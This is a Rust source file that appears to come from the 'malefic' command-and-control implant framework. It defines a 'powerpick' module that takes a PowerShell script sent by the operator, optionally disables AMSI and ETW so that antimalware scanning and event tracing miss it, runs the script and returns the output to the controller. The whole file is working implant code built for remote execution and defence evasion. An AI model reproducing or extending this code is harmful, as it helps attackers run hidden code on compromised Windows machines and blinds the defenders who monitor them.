use crate::{ check_request, Module, Result, TaskResult};
use malefic_proto::proto::implantpb::spite::Body;
use malefic_proto::proto::modulepb::BinaryResponse;

use async_trait::async_trait;
use malefic_helper::win::kit::bypass::{bypass_amsi, bypass_etw, enable_amsi, enable_etw};
use malefic_helper::win::kit::pwsh::pwsh_exec_command;
use malefic_trait::module_impl;

pub struct ExecutePowershell {}

#[async_trait]
#[module_impl("powerpick")]
impl Module for ExecutePowershell {
    #[allow(unused_variables)]
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut crate::Input,
        sender: &mut crate::Output,
    ) -> Result {
        let request = check_request!(receiver, Body::ExecuteBinary)?;
        let amsi_bypass = request.param.contains_key("bypass_amsi");
        let etw_bypass = request.param.contains_key("bypass_etw");

        let script = String::from_utf8(request.bin).expect("Invalid UTF-8 sequence");
        let result: Vec<u8>;
        unsafe {
            if amsi_bypass {
                bypass_amsi();
            }
            if etw_bypass {
                bypass_etw();
            }
            let ret = pwsh_exec_command(&script);
            result = ret.as_bytes().to_vec();
            if amsi_bypass {
                enable_amsi();
            }
            if etw_bypass {
                enable_etw();
            }
        }
        Ok(TaskResult::new_with_body(id, Body::BinaryResponse(BinaryResponse{
            status: 0,
            message: Vec::new(),
            data: result,
            err: "".to_string(),
        })))
    }
}
